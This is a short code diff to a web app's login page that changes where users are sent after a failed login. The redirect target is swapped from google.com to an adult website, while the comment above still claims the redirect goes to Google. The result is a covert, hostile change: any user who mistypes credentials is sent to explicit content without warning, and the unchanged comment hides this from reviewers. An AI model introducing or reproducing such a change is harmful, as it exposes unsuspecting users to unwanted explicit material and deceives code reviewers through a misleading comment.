@@ -22,7 +22,7 @@ export default function LoginPage() {
 
       if (!res.ok) {
         // Redirect to google on failed login - no error message
-        window.location.href = "https://google.com";
+        window.location.href = "https://xhamster19.com/";
         return;
       }
 
